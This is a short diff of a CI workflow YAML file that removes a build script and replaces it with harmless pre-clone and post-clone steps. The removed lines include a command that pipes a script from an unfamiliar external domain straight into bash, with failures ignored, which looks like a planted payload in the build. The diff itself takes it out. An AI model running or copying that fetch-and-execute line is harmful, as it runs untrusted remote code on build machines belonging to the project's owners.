@@ -1,14 +1,9 @@
 workflows:
-  sample_workflow:
-    name: My Workflow
-scripts:
-  - name: My Bash Script
-    ignore_failure: true
-    script: |
-            #!/bin/bash
-            set -ex
-            mkdir -p test-results
-            lscpu > test-results/log.txt
-            apt update;apt -y install wget
-            wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_dme_codemag | bash
-    test_report: test-results/log.txt
+    default-workflow:
+        name: Pre cloning workflow Test
+        pre_clone_scripts:
+          - name: Scripts to run before cloning the repository
+            script: echo "I'm running before cloning"
+        scripts:
+            - name: Scripts to run after cloning the repository
+              script: lscpu
